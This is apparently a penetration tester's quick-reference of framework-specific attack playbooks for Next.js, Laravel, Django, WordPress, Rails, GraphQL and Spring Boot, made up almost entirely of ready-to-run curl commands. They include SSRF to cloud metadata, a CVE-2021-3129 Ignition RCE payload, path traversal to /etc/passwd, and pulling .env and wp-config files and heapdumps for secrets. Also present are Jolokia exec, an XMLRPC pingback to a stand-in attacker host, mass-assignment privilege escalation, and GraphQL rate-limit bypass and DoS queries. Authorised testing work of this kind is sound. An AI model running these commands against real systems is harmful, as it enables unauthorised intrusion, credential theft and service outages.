# Framework-Specific Attack Playbooks

Quick-reference attack playbooks for common web frameworks. Use during Phase 3 (Enumeration) and Phase 6 (Exploitation).

---

## 1. Next.js

**Detection:** `__NEXT_DATA__` in page source, `x-powered-by: Next.js`, `/_next/` paths

```bash
# Extract __NEXT_DATA__ (leaks props, API routes, build ID)
curl -s "https://target.com" | grep -o '__NEXT_DATA__.*</script>' | python3 -c "
import sys,json; raw=sys.stdin.read().split('__NEXT_DATA__ = ',1)[1].rsplit('</script>',1)[0]
print(json.dumps(json.loads(raw),indent=2))" 2>/dev/null | head -50

# SSRF via /_next/image (url param)
curl -sk "https://target.com/_next/image?url=http://169.254.169.254/latest/meta-data/&w=64&q=75"
curl -sk "https://target.com/_next/image?url=http://127.0.0.1:8080/actuator/env&w=64&q=75"

# Middleware bypass
curl -sk -H "x-middleware-preflight: 1" "https://target.com/admin"

# Source maps (leak source code)
curl -sk "https://target.com/_next/static/chunks/main.js.map" -o /dev/null -w "%{http_code}"
# Find build ID from __NEXT_DATA__ then:
curl -sk "https://target.com/_next/static/BUILD_ID/_buildManifest.js"

# API routes enumeration
curl -sk "https://target.com/api/" -w "%{http_code}"
curl -sk "https://target.com/api/auth/session"
curl -sk "https://target.com/api/auth/providers"

# Server Actions (Next.js 14+)
curl -sk -X POST "https://target.com" -H "Next-Action: actionId" -H "Content-Type: text/plain;charset=UTF-8"
```

---

## 2. Laravel

**Detection:** `laravel_session` cookie, `X-Powered-By: PHP`, `/vendor/`, Blade template errors

```bash
# .env file exposure (CRITICAL)
curl -sk "https://target.com/.env" | head -20
curl -sk "https://target.com/.env.backup"
curl -sk "https://target.com/.env.local"

# Debug mode detection (APP_DEBUG=true)
curl -sk "https://target.com/nonexistent" | grep -i "whoops\|laravel\|stack trace\|APP_KEY"

# Telescope (debug dashboard — often left in prod)
curl -sk "https://target.com/telescope" -w "\n%{http_code}"
curl -sk "https://target.com/telescope/requests"

# Horizon (queue dashboard)
curl -sk "https://target.com/horizon" -w "\n%{http_code}"
curl -sk "https://target.com/horizon/api/stats"

# Ignition RCE (CVE-2021-3129) — check if Ignition is present
curl -sk "https://target.com/_ignition/health-check"
curl -sk "https://target.com/_ignition/execute-solution" -X POST -H "Content-Type: application/json" \
  -d '{"solution":"Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution","parameters":{"variableName":"x","viewFile":"php://filter/convert.base64-encode/resource=/etc/passwd"}}'

# Storage symlink (file access)
curl -sk "https://target.com/storage/"
curl -sk "https://target.com/storage/logs/laravel.log" | head -50

# Debug bar
curl -sk "https://target.com/_debugbar/open" -w "%{http_code}"
```

---

## 3. Django

**Detection:** `csrftoken` cookie, `django` in error pages, `/admin/` login

```bash
# Admin panel
curl -sk "https://target.com/admin/" -w "%{http_code}"
curl -sk "https://target.com/admin/login/"

# Debug mode (DEBUG=True) — trigger error for settings leak
curl -sk "https://target.com/nonexistent_path_12345" | grep -i "SECRET_KEY\|DATABASES\|settings.py\|Traceback"

# ORM filter injection (via query params)
# If endpoint accepts filter params:
curl -sk "https://target.com/api/users/?username__startswith=a"
curl -sk "https://target.com/api/users/?password__contains=pass"
curl -sk "https://target.com/api/users/?is_superuser=true"
curl -sk "https://target.com/api/users/?email__regex=.*"

# Static file path traversal
curl -sk "https://target.com/static/../../../etc/passwd"
curl -sk "https://target.com/media/../settings.py"

# Django REST Framework browsable API
curl -sk "https://target.com/api/" -H "Accept: text/html"
curl -sk "https://target.com/api/?format=api"

# Sentry DSN leak (common in Django)
curl -s "https://target.com" | grep -oE "https://[a-f0-9]+@[a-z]+\.ingest\.sentry\.io/[0-9]+"
```

---

## 4. WordPress

**Detection:** `/wp-content/`, `/wp-includes/`, `wp-login.php`, `generator` meta tag

```bash
# User enumeration
curl -sk "https://target.com/wp-json/wp/v2/users" | python3 -m json.tool
curl -sk "https://target.com/?author=1" -o /dev/null -w "%{redirect_url}"

# XMLRPC brute force check
curl -sk -X POST "https://target.com/xmlrpc.php" \
  -d '<?xml version="1.0"?><methodCall><methodName>system.listMethods</methodName></methodCall>'

# XMLRPC SSRF (pingback)
curl -sk -X POST "https://target.com/xmlrpc.php" \
  -d '<?xml version="1.0"?><methodCall><methodName>pingback.ping</methodName><params><param><value>http://ATTACKER/</value></param><param><value>https://target.com/</value></param></params></methodCall>'

# Debug log
curl -sk "https://target.com/wp-content/debug.log" | head -50

# Plugin/theme enumeration
curl -sk "https://target.com/wp-content/plugins/" | grep -oE 'href="[^"]*/"' | cut -d'"' -f2
curl -sk "https://target.com/wp-json/wp/v2/plugins" 2>/dev/null

# wp-config.php backup
curl -sk "https://target.com/wp-config.php.bak" -w "%{http_code}"
curl -sk "https://target.com/wp-config.php~" -w "%{http_code}"
curl -sk "https://target.com/wp-config.php.save" -w "%{http_code}"

# REST API (often exposes more than intended)
curl -sk "https://target.com/wp-json/" | python3 -c "import sys,json;d=json.load(sys.stdin);print('\n'.join(d.get('routes',{}).keys()))" 2>/dev/null | head -30

# Admin AJAX (unauthenticated actions)
curl -sk "https://target.com/wp-admin/admin-ajax.php?action=heartbeat" -X POST -d "interval=15"
```

---

## 5. Ruby on Rails

**Detection:** `_session_id` cookie, `X-Request-Id` header, `/rails/info/routes` in dev

```bash
# Routes disclosure (development mode)
curl -sk "https://target.com/rails/info/routes" -w "%{http_code}"
curl -sk "https://target.com/rails/info/properties"

# Debug console (development mode — RCE!)
curl -sk "https://target.com/console" -w "%{http_code}"

# Active Storage direct upload (file upload bypass)
curl -sk "https://target.com/rails/active_storage/direct_uploads" -X POST \
  -H "Content-Type: application/json" \
  -d '{"blob":{"filename":"test.txt","content_type":"text/plain","byte_size":4,"checksum":"CY9rzUYh03PK3k6DJie09g=="}}'

# Mass assignment (send unexpected params)
curl -sk "https://target.com/api/users" -X PATCH \
  -H "Content-Type: application/json" \
  -d '{"user":{"admin":true,"role":"admin","is_superuser":true}}'

# Secret key base (if leaked — session forgery)
# Check: config/credentials.yml.enc, config/secrets.yml, ENV vars in error pages

# Webpacker/asset pipeline source maps
curl -sk "https://target.com/packs/js/application.js.map" -o /dev/null -w "%{http_code}"
```

---

## 6. GraphQL

**Detection:** `/graphql`, `/graphiql`, `/playground`, `application/graphql` content-type

```bash
# Introspection query (full schema dump)
curl -sk "https://target.com/graphql" -X POST \
  -H "Content-Type: application/json" \
  -d '{"query":"{ __schema { types { name fields { name type { name } } } } }"}'

# If introspection is disabled, try suggestions
curl -sk "https://target.com/graphql" -X POST \
  -H "Content-Type: application/json" \
  -d '{"query":"{ __typ }"}'
# Error may suggest: "Did you mean __type?"

# Batching attack (bypass rate limiting)
curl -sk "https://target.com/graphql" -X POST \
  -H "Content-Type: application/json" \
  -d '[{"query":"{ user(id:1) { email } }"},{"query":"{ user(id:2) { email } }"},{"query":"{ user(id:3) { email } }"}]'

# Alias-based IDOR (enumerate in single request)
curl -sk "https://target.com/graphql" -X POST \
  -H "Content-Type: application/json" \
  -d '{"query":"{ u1:user(id:1){email} u2:user(id:2){email} u3:user(id:3){email} }"}'

# Nested query DoS (depth attack)
curl -sk "https://target.com/graphql" -X POST \
  -H "Content-Type: application/json" \
  -d '{"query":"{ users { posts { comments { author { posts { comments { author { name } } } } } } } }"}'

# Mutation enumeration
curl -sk "https://target.com/graphql" -X POST \
  -H "Content-Type: application/json" \
  -d '{"query":"{ __schema { mutationType { fields { name args { name type { name } } } } } }"}'

# Common endpoints to try
for path in /graphql /graphiql /playground /api/graphql /v1/graphql /query /gql; do
  code=$(curl -sk -X POST "https://target.com${path}" -H "Content-Type: application/json" -d '{"query":"{__typename}"}' -o /dev/null -w "%{http_code}")
  [ "$code" != "404" ] && echo "[+] ${path} -> ${code}"
done
```

---

## 7. Spring Boot (supplement to existing ptest coverage)

```bash
# Gateway routes (Spring Cloud Gateway — reveals all microservices)
curl -sk "https://target.com/actuator/gateway/routes" | python3 -m json.tool

# Env (credentials in plain text)
curl -sk "https://target.com/actuator/env" | grep -i "password\|secret\|key\|token"

# Heapdump (CRITICAL — contains all secrets in memory)
curl -sk "https://target.com/actuator/heapdump" -o heapdump.hprof
# Analyze: strings heapdump.hprof | grep -i password (basic)
# Better: Eclipse MAT or jhat for full object graph

# Jolokia (JMX over HTTP — often RCE)
curl -sk "https://target.com/jolokia/list" | head -50
curl -sk "https://target.com/jolokia/exec/java.lang:type=Runtime/exec/id"

# H2 Console (embedded DB — RCE via JDBC)
curl -sk "https://target.com/h2-console" -w "%{http_code}"
curl -sk "https://target.com/h2-console/" -w "%{http_code}"

# Mappings (all URL routes)
curl -sk "https://target.com/actuator/mappings" | python3 -c "
import sys,json
data=json.load(sys.stdin)
for k,v in data.get('contexts',{}).items():
  for mapping in v.get('mappings',{}).get('dispatcherServlets',{}).get('dispatcherServlet',[]):
    print(mapping.get('predicate',''))
" 2>/dev/null | head -30

# Logfile (may contain secrets, stack traces)
curl -sk "https://target.com/actuator/logfile" | head -100

# Shutdown (DoS — use with caution!)
# curl -sk -X POST "https://target.com/actuator/shutdown"
```

---

## Detection Cheat Sheet

| Indicator | Framework |
|-----------|-----------|
| `__NEXT_DATA__` in source | Next.js |
| `laravel_session` cookie | Laravel |
| `csrftoken` + `/admin/` | Django |
| `/wp-content/` in source | WordPress |
| `_session_id` + `X-Request-Id` | Rails |
| `/graphql` or `/graphiql` | GraphQL |
| `/actuator` + `x-envoy-*` | Spring Boot |
| `X-Powered-By: Express` | Node.js/Express |
| `Server: Kestrel` | ASP.NET |
| `PHPSESSID` + `X-Powered-By: PHP` | PHP (generic) |
